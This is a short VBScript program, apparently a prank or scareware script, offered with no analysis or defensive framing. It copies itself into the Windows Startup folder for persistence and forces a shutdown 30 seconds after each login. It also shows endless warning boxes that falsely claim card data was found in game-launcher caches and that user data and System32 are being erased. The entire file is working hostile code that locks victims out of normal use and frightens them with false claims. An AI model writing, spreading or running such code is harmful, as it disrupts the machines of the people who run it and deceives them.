Set fso = CreateObject("Scripting.FileSystemObject")

' Get the current script path
src = WScript.ScriptFullName

' Get the Startup folder path
Set shell = CreateObject("WScript.Shell")
startupFolder = shell.SpecialFolders("Startup")

' Build the destination path
dest = startupFolder & "\" & fso.GetFileName(src)

' Copy the file if not already there
If Not fso.FileExists(dest) Then
    fso.CopyFile src, dest
End If

' Notify and initiate shutdown
Set objShell = CreateObject("WScript.Shell")
objShell.Run "shutdown -s -t 30 -c ""Script Activated""", 0, False

' Show a warning message to user
do
MsgBox "credit+debit found in C:/porgramfilesX86/Epicgames/cache+C:Program FilesX86/EA Launcher/cookies. Moving on to clear pc drives...", vbExclamation, "clearing drives"
MsgBox "Success fully cleared all user data, moving on to system32..."
MsgBox "System32 clearing shut down iminent..."
loop